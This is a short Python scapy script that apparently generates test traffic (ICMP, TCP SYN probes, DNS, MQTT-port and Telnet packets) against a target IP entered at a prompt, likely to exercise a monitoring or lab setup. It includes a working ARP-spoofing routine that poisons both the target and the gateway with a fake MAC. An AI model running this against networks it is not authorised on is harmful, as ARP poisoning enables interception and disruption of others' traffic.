# this tests port 80, 21, 22 UDP DNS, ARP, and MQTT
# also attempts to test ARP Spoofing (doesn't work here)
# to test MQTT another way, run a command like: mosquitto_pub -h [target ip] -t "test/topic" -m "Hello, MQTT"

from scapy.all import *
import time
import threading

def get_mac(ip):
    """Get MAC address for a given IP using ARP request."""
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def send_icmp(target):
    print("[+] Sending ICMP packets")
    for _ in range(5):
        send(IP(dst=target)/ICMP(), verbose=False)
        time.sleep(1)

def send_tcp(target, port):
    print(f"[+] Sending TCP SYN to {port}")
    for _ in range(5):
        send(IP(dst=target)/TCP(dport=port, flags="S"), verbose=False)
        time.sleep(1)

def send_udp_dns(target):
    print("[+] Sending UDP DNS request")
    for _ in range(5):
        send(IP(dst=target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com")), verbose=False)
        time.sleep(1)

def send_arp_spoof(target_ip, fake_mac, gateway_ip):
    print("[+] Sending ARP spoof packets")
    target_mac = get_mac(target_ip)  # Get target MAC address
    if not target_mac:
        print(f"[-] Could not get MAC address for {target_ip}")
        return
    
    for _ in range(5):
        # Send ARP reply to target IP (spoofing the gateway MAC address)
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=fake_mac, hwdst=target_mac), verbose=False)
        # Send ARP reply to gateway (spoofing the target IP's MAC address)
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=fake_mac, hwdst=get_mac(gateway_ip)), verbose=False)
        time.sleep(1)

def send_mqtt(target):
    print("[+] Sending MQTT packet")
    for _ in range(10):
        send(IP(dst=target)/TCP(dport=1883, flags="P"), verbose=False)
        time.sleep(1)

def send_telnet(target):
    print("[+] Sending Telnet packet")
    for _ in range(5):
        send(IP(dst=target)/TCP(dport=23, flags="S"), verbose=False)
        time.sleep(1)

def start_attack(target_ip, gateway_ip):
    fake_mac = "00:11:22:33:44:55"  # Your fake MAC address (should be a valid MAC)
    threads = [
        threading.Thread(target=send_icmp, args=(target_ip,)),
        threading.Thread(target=send_tcp, args=(target_ip, 80)),  # HTTP
        threading.Thread(target=send_tcp, args=(target_ip, 21)),  # FTP
        threading.Thread(target=send_tcp, args=(target_ip, 22)),  # SSH
        threading.Thread(target=send_udp_dns, args=(target_ip,)),
        threading.Thread(target=send_arp_spoof, args=(target_ip, fake_mac, gateway_ip)),
        threading.Thread(target=send_mqtt, args=(target_ip,)),  # MQTT
        threading.Thread(target=send_telnet, args=(target_ip,))  # Telnet
    ]
    
    for t in threads:
        t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    target_ip = input("Enter target IP: ")
    gateway_ip = input("Enter gateway IP: ")
    start_attack(target_ip, gateway_ip)
